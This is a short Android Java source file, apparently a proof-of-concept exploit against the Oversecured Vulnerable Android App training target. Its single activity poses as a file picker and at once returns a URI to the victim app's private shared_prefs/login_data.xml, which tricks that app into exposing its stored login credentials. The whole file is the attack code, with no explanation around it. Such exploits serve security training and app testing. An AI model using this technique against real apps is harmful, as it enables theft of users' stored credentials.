package com.example.mypicker;

import androidx.appcompat.app.AppCompatActivity;

import android.content.Intent;
import android.net.Uri;
import android.os.Bundle;

public class PickeMe extends AppCompatActivity {

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setResult(-1, new Intent().setData(Uri.parse("file:///data/data/oversecured.ovaa/shared_prefs/login_data.xml")));
        finish();
    }
}